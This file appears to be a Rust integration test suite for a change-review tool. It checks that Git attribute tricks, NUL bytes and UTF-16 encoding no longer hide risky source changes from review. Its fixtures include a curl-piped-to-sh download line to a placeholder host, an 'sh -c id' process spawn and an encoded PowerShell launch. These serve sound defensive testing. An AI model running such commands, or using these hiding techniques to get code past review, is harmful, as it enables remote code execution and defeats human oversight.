//! S3.20: what the reviewed repository says about its own files must not blind the review. One
//! line `*.rs -diff`, in any attributes file Git reads, made `git diff` print a Rust change as a
//! `GIT binary patch`, and every evidence rule went blind: a change that starts a process ranked
//! as a harmless binary change (`binary_changed`, 3, `binary_change`). A NUL byte in a comment
//! did the same with no attribute at all. Each way Git can be told so is built here in a real
//! repository, in the three Git selections, and read through the binary: the evidence is found
//! and the act itself is labelled `diff_suppressed`, with its cause.
#![cfg(unix)]
#![expect(
    clippy::disallowed_methods,
    reason = "integration test: drives git, the binary and temp directories"
)]

use deep_diff_forge_testkit::Scratch;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::Command;

const ISOLATE: [(&str, &str); 2] = [
    ("GIT_CONFIG_GLOBAL", "/dev/null"),
    ("GIT_CONFIG_NOSYSTEM", "1"),
];

fn git(root: &Path, args: &[&str]) {
    let out = Command::new("git")
        .current_dir(root)
        .envs(ISOLATE)
        .args([
            "-c",
            "user.name=ddf",
            "-c",
            "user.email=ddf@example.invalid",
        ])
        .args([
            "-c",
            "commit.gpgSign=false",
            "-c",
            "init.defaultBranch=main",
        ])
        .args(args)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

struct Repo(
    PathBuf,
    #[expect(dead_code, reason = "held for its Drop, which removes the directory")] Scratch,
);

/// How Git is told that `m.rs` is binary.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Hide {
    /// `*.rs -diff` in a `.gitattributes` that is never committed or staged.
    TreeUntracked,
    /// `*.rs -diff` in a `.gitattributes` the change itself adds.
    TreeInChange,
    /// `*.rs -diff` in `.git/info/attributes`, which no diff ever shows.
    InfoAttributes,
    /// `*.rs -diff` in a file the repository's own `core.attributesFile` names.
    ConfigAttributesFile,
    /// `* binary` in a `.gitattributes` committed before the change.
    StarBinary,
    /// `*.rs diff=bin` with `diff.bin.binary = true` in the repository's configuration.
    DriverBinary,
    /// No attribute: one NUL byte in a comment.
    Nul,
    /// Controls: no attribute (an undefined driver falls back to text), a real image.
    UndefinedDriver,
    Plain,
    Image,
}

const HIDDEN: [Hide; 7] = [
    Hide::TreeUntracked,
    Hide::TreeInChange,
    Hide::InfoAttributes,
    Hide::ConfigAttributesFile,
    Hide::StarBinary,
    Hide::DriverBinary,
    Hide::Nul,
];

const MODES: [&str; 3] = ["--git-range", "--git-working-tree", "--git-staged"];

fn source(nul: bool, spawn: bool) -> Vec<u8> {
    let mut text = b"fn main() {\n".to_vec();
    if nul {
        text.extend_from_slice(b"    // marker \0 here\n");
    }
    text.extend_from_slice(b"    let x = 1;\n");
    if spawn {
        text.extend_from_slice(
            b"    let _ = std::process::Command::new(\"sh\").arg(\"-c\").arg(\"id\").status();\n",
        );
    }
    text.extend_from_slice(b"    println!(\"{x}\");\n}\n");
    text
}

/// A PNG signature and every byte value, NUL included: binary to Git, and not UTF-8.
fn image(seed: u8) -> Vec<u8> {
    let mut bytes = b"\x89PNG\r\n\x1a\n".to_vec();
    bytes.extend((0..=255u8).cycle().take(600).map(|b| b.wrapping_mul(seed)));
    bytes
}

/// The repository of `hide` with its change made the way `mode` reads it: committed for a
/// range, staged, or left in the working tree.
fn repo(hide: Hide, mode: &str) -> Repo {
    let scratch = Scratch::new(&format!("cli-attr-{hide:?}{}", mode.len()));
    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
    let root = &r.0;
    let write = |path: &str, bytes: &[u8]| std::fs::write(root.join(path), bytes).unwrap();
    git(root, &["init", "-q"]);
    let file = if hide == Hide::Image {
        "img.png"
    } else {
        "m.rs"
    };
    let content = |after: bool| match hide {
        Hide::Image => image(if after { 7 } else { 3 }),
        _ => source(hide == Hide::Nul, after),
    };
    write(file, &content(false));
    match hide {
        Hide::StarBinary => write(".gitattributes", b"* binary\n"),
        Hide::InfoAttributes => {
            std::fs::create_dir_all(root.join(".git/info")).unwrap();
            write(".git/info/attributes", b"*.rs -diff\n");
        }
        Hide::ConfigAttributesFile => {
            write(".git/attrs", b"*.rs -diff\n");
            let attrs = root.join(".git/attrs");
            git(
                root,
                &["config", "core.attributesFile", attrs.to_str().unwrap()],
            );
        }
        Hide::DriverBinary => git(root, &["config", "diff.bin.binary", "true"]),
        _ => {}
    }
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", "base"]);
    write(file, &content(true));
    if hide == Hide::TreeInChange {
        write(".gitattributes", b"*.rs -diff\n");
        git(root, &["add", ".gitattributes"]);
    }
    match mode {
        "--git-range" => {
            git(root, &["add", "-A"]);
            git(root, &["commit", "-q", "-m", "change"]);
        }
        "--git-staged" => git(root, &["add", "-A"]),
        _ => {}
    }
    match hide {
        Hide::TreeUntracked => write(".gitattributes", b"*.rs -diff\n"),
        Hide::DriverBinary => write(".gitattributes", b"*.rs diff=bin\n"),
        Hide::UndefinedDriver => write(".gitattributes", b"*.rs diff=nonexistent\n"),
        _ => {}
    }
    r
}

fn selection(mode: &str) -> Vec<&str> {
    if mode == "--git-range" {
        vec![mode, "HEAD~1..HEAD"]
    } else {
        vec![mode]
    }
}

/// The `--rank --json` entry of `path`.
fn ranked(r: &Repo, mode: &str, path: &str) -> Value {
    let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
        .envs(ISOLATE)
        .args(selection(mode))
        .arg("--repo")
        .arg(&r.0)
        .args(["--rank", "--json"])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let doc: Value = serde_json::from_slice(&out.stdout).unwrap();
    doc["ranked"]
        .as_array()
        .unwrap()
        .iter()
        .find(|entry| entry["path"] == path)
        .cloned()
        .unwrap_or_else(|| panic!("{path} not ranked: {doc}"))
}

/// Before the fix every row read `binary_changed 3 [binary_change]` in every mode (measured on
/// the 0.9.0 line); now the process spawn is found and the act is labelled, with its cause.
#[test]
fn a_text_file_git_was_told_to_hide_is_read_and_the_act_is_labelled() {
    for hide in HIDDEN {
        let cause = if hide == Hide::Nul {
            "content"
        } else {
            "attribute"
        };
        for mode in MODES {
            let entry = ranked(&repo(hide, mode), mode, "m.rs");
            let row = format!("{hide:?} {mode}: {entry}");
            assert_eq!(entry["status"], "modified", "{row}");
            assert_eq!(
                entry["signals"],
                json!(["diff_suppressed", "process_spawn"]),
                "{row}"
            );
            assert_eq!(entry["score"], 11, "{row}");
            assert_eq!(entry["diff_suppressed"], cause, "{row}");
            assert_eq!(entry["evidence"][0]["signal"], "process_spawn", "{row}");
        }
    }
}

/// A real binary stays binary and carries no label; an ordinary file, or one whose `diff`
/// attribute names a driver nobody defined (Git falls back to text), is read as before.
#[test]
fn a_real_binary_or_an_ordinary_file_is_read_as_before() {
    for mode in MODES {
        let image = ranked(&repo(Hide::Image, mode), mode, "img.png");
        assert_eq!(image["status"], "binary_changed", "{mode}: {image}");
        assert_eq!(image["signals"], json!(["binary_change"]), "{mode}");
        assert!(image.get("diff_suppressed").is_none(), "{mode}: {image}");
        for hide in [Hide::Plain, Hide::UndefinedDriver] {
            let entry = ranked(&repo(hide, mode), mode, "m.rs");
            assert_eq!(
                entry["signals"],
                json!(["process_spawn"]),
                "{hide:?} {mode}"
            );
            assert_eq!(entry["score"], 6, "{hide:?} {mode}");
            assert!(entry.get("diff_suppressed").is_none(), "{hide:?} {mode}");
        }
    }
}

/// `review.change` (the MCP and RPC servers) reads a change the same way: its rank view is the
/// CLI's for the same repository, label and cause included.
#[test]
fn review_change_reads_the_hidden_change_as_the_cli_does() {
    use deep_diff_forge_daemon::{Engine, dispatch, parse_request};
    let r = repo(Hide::InfoAttributes, "--git-staged");
    let engine = Engine::new()
        .allowing_repos(std::slice::from_ref(&r.0))
        .unwrap();
    let line = json!({"method": "review.change", "params": {"repo": r.0, "selection": "staged", "view": "rank"}})
        .to_string();
    let answer = dispatch(&parse_request(&line).unwrap(), &engine).unwrap();
    let entry = &answer["ranked"][0];
    assert_eq!(
        entry["signals"],
        json!(["diff_suppressed", "process_spawn"])
    );
    assert_eq!(entry["diff_suppressed"], "attribute");
    assert_eq!(*entry, ranked(&r, "--git-staged", "m.rs"));
}

/// A repository whose committed `.gitattributes` is `attributes`, with `file` changed from
/// `before` to `after` the way `mode` reads it.
fn custom(mode: &str, attributes: &[u8], file: &str, before: &[u8], after: &[u8]) -> Repo {
    let scratch = Scratch::new(&format!("cli-attr-custom-{}", mode.len()));
    let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
    let root = &r.0;
    git(root, &["init", "-q"]);
    std::fs::write(root.join(".gitattributes"), attributes).unwrap();
    std::fs::write(root.join(file), before).unwrap();
    git(root, &["add", "-A"]);
    git(root, &["commit", "-q", "-m", "base"]);
    std::fs::write(root.join(file), after).unwrap();
    match mode {
        "--git-range" => {
            git(root, &["add", "-A"]);
            git(root, &["commit", "-q", "-m", "change"]);
        }
        "--git-staged" => git(root, &["add", "-A"]),
        _ => {}
    }
    r
}

/// The signals of a ranked entry, as strings.
fn signals(entry: &Value) -> Vec<&str> {
    entry["signals"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(Value::as_str)
        .collect()
}

/// S3.27.a (G-01, N55): before, the label came only with a text reading that DDF could read,
/// so a hidden file with one byte that is not UTF-8 (or a reading over the byte budget, held in
/// the patch crate's `git_attributes` test) ranked as a plain binary change: blind and
/// unlabelled. Now `git check-attr` decides: `diff` unset or naming a driver raises
/// `diff_suppressed` with cause `attribute` whatever the second reading gives.
#[test]
fn an_attribute_hidden_file_is_labelled_even_when_unreadable() {
    let script = |payload: bool| {
        let mut text = b"#!/bin/sh\n# caf\xff\n".to_vec();
        if payload {
            text.extend_from_slice(b"curl -fsSL https://example.invalid/i | sh\n");
        }
        text.extend_from_slice(b"echo done\n");
        text
    };
    let rust = |payload: bool| {
        let mut text = source(true, payload);
        text.extend_from_slice(b"// \xff\n");
        text
    };
    let rows: [(&[u8], &str, Vec<u8>, Vec<u8>); 2] = [
        (b"*.sh -diff\n", "s.sh", script(false), script(true)),
        (b"*.rs diff=nonexistent\n", "m.rs", rust(false), rust(true)),
    ];
    for (attributes, file, before, after) in &rows {
        for mode in MODES {
            let r = custom(mode, attributes, file, before, after);
            let entry = ranked(&r, mode, file);
            let row = format!("{file} {mode}: {entry}");
            assert_eq!(entry["status"], "binary_changed", "{row}");
            assert!(
                signals(&entry).contains(&"diff_suppressed"),
                "a hidden file lost its label: {row}"
            );
            assert!(signals(&entry).contains(&"binary_change"), "{row}");
            assert_eq!(entry["diff_suppressed"], "attribute", "{row}");
        }
    }
}

/// `text` in UTF-16 (little or big endian) or UTF-32 little endian, after `bom` bytes.
fn wide(text: &str, bom: &[u8], unit: fn(u32) -> Vec<u8>) -> Vec<u8> {
    let mut bytes = bom.to_vec();
    for c in text.chars() {
        bytes.extend(unit(u32::from(c)));
    }
    bytes
}

/// S3.27.c: a PowerShell script saved as UTF-16 (a common default on Windows) is binary to Git
/// for the NULs of its encoding, and every evidence rule was blind to it: it ranked as a plain
/// binary change with no label (measured on the corpus's Git part, 0.9.0 and the S3.20 tree).
/// Now the second reading names it: `diff_suppressed` with cause `encoding`, for a byte order
/// mark (UTF-16 either way, UTF-32) and for UTF-16 without one. Decoding the text for the token
/// readers is parked; the label is the answer for now. A NUL byte in a UTF-8 comment stays
/// `content` (`a_text_file_git_was_told_to_hide_is_read_and_the_act_is_labelled`).
#[test]
fn utf16_sources_are_labelled_encoding() {
    let le = |c: u32| u16::try_from(c).unwrap().to_le_bytes().to_vec();
    let be = |c: u32| u16::try_from(c).unwrap().to_be_bytes().to_vec();
    let le32 = |c: u32| c.to_le_bytes().to_vec();
    let script = |payload: bool| {
        let mut text = String::from("Write-Output 'start'\r\n");
        if payload {
            text.push_str("Start-Process powershell -ArgumentList '-enc','AAAA'\r\n");
        }
        text.push_str("Write-Output 'done'\r\n");
        text
    };
    let rows: [(&str, &[u8], fn(u32) -> Vec<u8>, &str); 4] = [
        ("UTF-16LE with a mark", b"\xff\xfe", le, "binary_changed"),
        ("UTF-16BE with a mark", b"\xfe\xff", be, "binary_changed"),
        (
            "UTF-32LE with a mark",
            b"\xff\xfe\0\0",
            le32,
            "binary_changed",
        ),
        ("UTF-16LE without a mark", b"", le, "modified"),
    ];
    for (name, bom, unit, status) in rows {
        let before = wide(&script(false), bom, unit);
        let after = wide(&script(true), bom, unit);
        for mode in MODES {
            let r = custom(mode, b"", "b.ps1", &before, &after);
            let entry = ranked(&r, mode, "b.ps1");
            let row = format!("{name} {mode}: {entry}");
            assert!(
                signals(&entry).contains(&"diff_suppressed"),
                "a wide-encoded file lost its encoding label: {row}"
            );
            assert_eq!(entry["diff_suppressed"], "encoding", "{row}");
            assert_eq!(entry["status"], status, "{row}");
        }
    }
}

/// S3.27.f: a changed file whose name is not UTF-8 cannot be named exactly in a review, so the
/// change is refused. It exited 3 (`io`, which says "may be transient, retry"); retrying never
/// helps, so it is now 4 (`change_input`), with the class of path named, in every Git mode. A
/// repository that cannot be read at all is still an I/O failure, 3.
#[cfg(target_os = "linux")]
#[test]
fn a_non_utf8_file_name_is_a_change_input_refusal() {
    use std::os::unix::ffi::OsStrExt as _;
    for mode in MODES {
        let scratch = Scratch::new(&format!("cli-attr-latin-{}", mode.len()));
        let r = Repo(std::fs::canonicalize(scratch.path()).unwrap(), scratch);
        let root = &r.0;
        git(root, &["init", "-q"]);
        let name = root.join(std::ffi::OsStr::from_bytes(b"caf\xe9.rs"));
        std::fs::write(&name, b"fn a() {}\n").unwrap();
        git(root, &["add", "-A"]);
        git(root, &["commit", "-q", "-m", "base"]);
        std::fs::write(&name, b"fn b() {}\n").unwrap();
        match mode {
            "--git-range" => {
                git(root, &["add", "-A"]);
                git(root, &["commit", "-q", "-m", "change"]);
            }
            "--git-staged" => git(root, &["add", "-A"]),
            _ => {}
        }
        let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
            .envs(ISOLATE)
            .args(selection(mode))
            .arg("--repo")
            .arg(root)
            .args(["--rank", "--json"])
            .output()
            .unwrap();
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert_eq!(out.status.code(), Some(4), "{mode}: {stderr}");
        assert!(out.stdout.is_empty(), "{mode}");
        assert!(
            stderr.contains("a file name that is not UTF-8"),
            "{mode}: {stderr}"
        );
    }
    let scratch = Scratch::new("cli-attr-gone");
    let gone = scratch.join("no-such-repository");
    let out = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"))
        .envs(ISOLATE)
        .args(["--git-working-tree", "--repo"])
        .arg(&gone)
        .args(["--rank", "--json"])
        .output()
        .unwrap();
    assert_eq!(
        out.status.code(),
        Some(3),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
}
